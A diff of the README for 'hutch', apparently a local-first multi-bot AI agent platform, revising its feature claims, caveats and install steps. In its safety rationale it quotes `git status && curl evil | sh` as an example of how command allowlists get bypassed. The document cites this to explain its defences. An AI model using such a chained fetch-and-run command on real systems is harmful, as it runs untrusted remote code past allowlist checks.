@@ -2,13 +2,18 @@
 
 > Your bots. Your machine. Your rules.
 
-hutch is a **local-first, open-source multi-bot agent platform**. Run multiple named AI bots on
-your own machine — each with its own model, tools, schedule, memory, and sandboxed workspace —
-with human approval gates, hard spending caps, and complete run transcripts.
+hutch is a **local-first, open-source multi-bot agent platform** (early software, Linux first). Run named AI bots on
+your own machine, each with its own model, tools, schedule, memory and workspace, with human approval gates,
+step/time/token caps and run transcripts.
 
-Cloud agent platforms rent you a black box with usage limits. hutch inverts that: the
-orchestrator, memory, logs, and bots live in one directory on your disk, with any model — local
-(Ollama, llama.cpp, LM Studio) or hosted (OpenAI and any OpenAI-compatible API).
+Hosted agent products (OpenAI dots, Grok Bot) give each agent a computer in the vendor's cloud. hutch runs on your
+machine instead: the orchestrator, memory, logs and bots live in one directory on your disk, with models you choose, local
+(Ollama, llama.cpp, LM Studio) or hosted (Anthropic, OpenAI, any OpenAI-compatible API). The trade-off is that
+nothing runs while the machine is asleep.
+
+**Status.** What works and what does not is tracked in [docs/realignment/baseline.md](docs/realignment/baseline.md) (measured
+today) and [docs/realignment/ledger.md](docs/realignment/ledger.md) (what is being fixed). Not published: the repository is private
+and there is no PyPI release, so install from a source checkout.
 
 ```
 $ hutch run tidy-downloads "sort this week's downloads"
@@ -21,18 +26,17 @@ $ hutch run tidy-downloads "sort this week's downloads"
 
 ## Why it exists
 
-Every core requirement traces to a **documented failure** of existing agent products — the $447
-silent runaway bill, schedules that quietly never ran, agents that read `~/.ssh`, allowlists
-bypassed with `git status && curl evil | sh`, permission prompts so relentless people switch to
-yolo mode. The receipts and the requirement traceability live in
-[docs/research/complaints.md](docs/research/complaints.md); the design answers are in
-[docs/safety.md](docs/safety.md).
+Each core requirement traces to a *reported* failure class of agent products: runaway loops that keep spending, schedules that
+quietly never ran, agents reading files they should not, allowlists bypassed with `git status && curl evil | sh`, permission
+prompts so relentless people switch to yolo mode. Most of these are individual reports, not measured prevalence; the sources,
+and which of them did not survive re-checking, are in [docs/research/complaints.md](docs/research/complaints.md). The design
+answers, and their limits, are in [docs/safety.md](docs/safety.md).
 
 ## Quickstart
 
 ```bash
-git clone https://github.com/K-Arthur/hutch && cd hutch
-pip install -e .               # or: uv venv && uv pip install -e ".[dev]"
+cd hutch                       # your source checkout (the repository is private)
+pip install -e .               # from a source checkout; or: uv venv && uv pip install -e ".[dev]"
 hutch init                   # state dir + 3 starter bots (free mock model — no API key)
 hutch serve                  # dashboard → http://127.0.0.1:8787
 ```
@@ -57,18 +61,21 @@ hutch daemon                 # headless: schedules, dispatch, approval expiry
 ## Feature highlights
 
 - **Multiple named bots** — own model, tools, schedule, memory, workspace; pause/resume; templates
-- **Any model, local first** — native Ollama (context size always set), Anthropic, OpenAI, and any OpenAI- or Anthropic-compatible endpoint; free offline mock runtime
+- **Model choice, local first** — native Ollama (context size always set), Anthropic, OpenAI, and OpenAI- or Anthropic-compatible endpoints; free offline mock runtime. Tested against recorded fakes; live provider and Ollama runs depend on your setup
 - **Switch models from the chat** — a composer menu shows what fits this machine, what it costs and what is missing; per message, never a silent edit of the bot
 - **Subscription plans as connections** — OpenCode Go, Xiaomi MiMo Token Plan or your own endpoint, each with its own key, allowance meter and terms notice
 - **Knows your hardware** — fit/tight/won't-fit per model, model slots that batch runs, and `hutch doctor` that prints the fix for every problem
-- **Scheduling that survives real life** — IANA-timezone cron, DST-correct, catch-up after sleep,
-  never overlapping runs
+- **Scheduling that survives sleep and DST** — IANA-timezone cron, DST-correct, catch-up after sleep, one run per bot at a time
+  inside a process (two schedulers sharing one database are not yet safe; see the ledger)
 - **Approvals that don't nag** — ask-once with sticky always-allows; unanswered = denied
-- **Hard caps** — steps, wall-clock, daily tokens per bot
-- **Workspace jail** — path-jailed file ops; shells run with redirected HOME; secrets denied by class
-- **Full transcripts** — every run in SQLite + append-only JSONL on disk
-- **Browser with memory** — persistent per-bot Chromium profiles; pauses for humans at CAPTCHA/MFA
-- **Pluggable runtimes** — built-in loop (default), or delegate a bot to [Pi](https://pi.dev) / [OpenCode](https://opencode.ai)
+- **Caps** — steps, wall-clock, daily tokens per bot; spend caps for priced hosted models (a token cap is not a currency cap)
+- **Workspace path jail** — file tools cannot leave the workspace; shell commands are policy-checked and run with a redirected
+  HOME and a minimal environment. This is policy, **not an OS sandbox**: a script a bot runs can read what your user can read
+- **Run transcripts** — every run in SQLite + a JSONL mirror on disk
+- **Browser (experimental)** — optional Playwright extra; parks the run in a "needs you" state at CAPTCHA/MFA walls. Known gaps: one
+  browser context per process rather than per bot, and no visible handoff session yet
+- **Other runtimes (experimental)** — built-in loop (default), or delegate a bot to [Pi](https://pi.dev) / [OpenCode](https://opencode.ai).
+  These run with their own tools outside hutch's policy gate
 
 ## Documentation
 
@@ -81,16 +88,17 @@ hutch daemon                 # headless: schedules, dispatch, approval expiry
 | [Connections](docs/connections.md) | subscription plans and custom endpoints, keys, allowances, what is unsupported and why |
 | [Design system](docs/design-system.md) | shared UI tokens, components, icon/emoji policy, a11y rules |
 | [Roadmap](docs/roadmap.md) | phases: hardening → capability → scale-out |
+| [Realignment](docs/realignment/baseline.md) | measured baseline, evidence ledger, [architecture decisions](docs/adr/), continuation ledger |
 | [Research](docs/research/) | orchestrator/runtime comparison; incident-based requirements |
 
-Marketing site: [website/](website/index.html) (responsive landing page with interactive sandbox, incident receipts, and bento grid).
+Marketing site: [website/](website/index.html) (static landing page; its claims are checked against the evidence ledger).
 Web Dashboard: 3-pane Chat Studio (`http://127.0.0.1:8787/#/chat`) with live approval interceptor, memory manager, sticky permissions, and mobile drawer tabs.
 
 ## Development
 
 ```bash
 uv venv && uv pip install -e ".[dev]"
-pytest                # 71 tests, fully offline (mock runtime)
+pytest --ignore=tests/e2e   # 637 tests, fully offline (mock runtime); tests/e2e needs Playwright browsers
 hutch demo seed && hutch serve   # rich dashboard state for manual testing
 ```
 
